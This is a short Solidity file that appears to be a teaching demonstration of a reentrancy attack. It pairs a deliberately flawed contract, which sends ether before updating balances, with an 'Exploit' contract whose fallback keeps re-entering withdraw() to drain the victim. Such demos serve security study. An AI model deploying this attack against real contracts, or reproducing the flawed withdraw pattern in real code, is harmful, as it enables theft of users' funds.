// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;


contract Exploit {

    VulnerableContract public vulnerablecontract;

    constructor(address _vulnerablecontract_address) public {
        vulnerablecontract = VulnerableContract(_vulnerablecontract_address);
    }

    receive() external payable {
        if (address(vulnerablecontract).balance >= 1 ether) {
            vulnerablecontract.withdraw(1 ether);
        }
    }

    function exploit() external payable {
        require(msg.value >= 1 ether);
        
        vulnerablecontract.deposit{value: 1 ether}();
        vulnerablecontract.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}


contract VulnerableContract {

    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] = balances[msg.sender] + msg.value;
    }

    function withdraw(uint _amount) public {
        require(balances[msg.sender] >= _amount);

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Withdraw Failed");

        balances[msg.sender] = balances[msg.sender] - _amount;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

}



